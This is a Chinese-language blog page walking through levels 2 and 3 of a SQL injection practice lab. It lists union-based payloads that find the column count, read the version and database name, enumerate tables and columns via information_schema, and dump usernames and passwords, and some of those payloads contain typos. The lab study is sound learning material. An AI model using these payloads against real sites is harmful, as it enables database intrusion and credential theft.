@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>sqli02-3 - 醉芳</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="往后余生,sql靶场手工注入02关有了第一关的思路，对SQL注入也有一定的了解了吧，接着来到第二关，往下看
+还是来一波判断注入类型加入 ‘  报错提醒，和第一关一样。我可以猜想：1，可能是我们的 ’ 没有被过,"> 
+    <meta name="author" content="小树"> 
+    <link rel="alternative" href="atom.xml" title="醉芳" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">醉芳</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">sqli02-3</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">sqli02-3</h1>
+        <div class="stuff">
+            <span>七月 08, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="sql靶场手工注入"><a href="#sql靶场手工注入" class="headerlink" title="sql靶场手工注入"></a>sql靶场手工注入</h1><h2 id="02关"><a href="#02关" class="headerlink" title="02关"></a>02关</h2><p>有了第一关的思路，对SQL注入也有一定的了解了吧，接着来到第二关，往下看</p>
+<p>还是来一波判断注入类型加入 ‘  报错提醒，和第一关一样。我可以猜想：1，可能是我们的 ’ 没有被过滤，导致语法错误。2，可能及时简单的“字符”注入从而导致多出来一个 ‘ ，导致语法错误</p>
+<p>?id=1’ –+</p>
+<p><img src="/2020/07/08/sqli02-3/01.png" alt></p>
+<p>接下来，验证一下我们的猜想</p>
+<p>这是第一种猜想</p>
+<p>?id=1’ and 1=1 –+</p>
+<p><img src="/2020/07/08/sqli02-3/02.png" alt></p>
+<p>这是第二种猜想</p>
+<p>?id=1 and 1=1 –+</p>
+<p><img src="/2020/07/08/sqli02-3/03.png" alt></p>
+<p>由此可以判断我们第二种猜想是一样的，可判断为数字型注入，</p>
+<p>接着判断是否存在注入点：</p>
+<p><img src="/2020/07/08/sqli02-3/04.png" alt></p>
+<p>没有回显，所以这里存在注入点，接下来，猜字段：</p>
+<p>（这里就不一一猜了，从1到4，只有4会回显错误，说明字段有3）</p>
+<p>?id=1 order by 4 –+</p>
+<p><img src="/2020/07/08/sqli02-3/05.png" alt></p>
+<p>接下来就union操作符进行联合查询</p>
+<p>?id=-1 union select 1,2,3 –+</p>
+<p>获得数据在2和3字段里面</p>
+<p><img src="/2020/07/08/sqli02-3/06.png" alt></p>
+<p>接下来就是用version（）看版本</p>
+<p>用database（）看当前网站使用的数据库：</p>
+<p>?id=-1 union select 1,version(),database() –+</p>
+<p><img src="/2020/07/08/sqli02-3/07.png" alt></p>
+<p>通过上面的语句可以得到版本是5.7.23</p>
+<p>数据库是 security</p>
+<p>接下来就是看数据库中的表名称信息：</p>
+<p>?id=-1 union select 1,2,grouo_concat(table_name) from information_schema.tables where table_schema=’security’</p>
+<p><img src="/2020/07/08/sqli02-3/08.png" alt></p>
+<p>查看库里的所有表</p>
+<p>?id=-1 union select 1,2group_concat(column_name) from information_schema,columns where table_name=’users’ –+</p>
+<p>查看表里的用户名和密码</p>
+<p>?id=-1 union select 1,2,group_concat(username,0x3a,password) from users –+</p>
+<p>到了这一步，就已经可以获得了用户名和密码了</p>
+<p>第二关和第一关都是差不多的，只是注入类型不一样的，后面的都差不多</p>
+<h2 id="03"><a href="#03" class="headerlink" title="03"></a>03</h2><p>还是判断注入类型先，然后这一次却看到了一个小括号</p>
+<p><img src="/2020/07/08/sqli02-3/09.png" alt></p>
+<p>可以猜想，这一次使用 ）闭合的，就验证一下</p>
+<p><img src="/2020/07/08/sqli02-3/10.png" alt></p>
+<p>猜想正确</p>
+<p>其他的跟上面的一样</p>
+<p>第三关需要加上）来闭合前面的SQL语句</p>
+<p>所以综合起来，前面三关的难度的话会相对的简单一些，只要理解了第一关，其他的都是差不多的</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
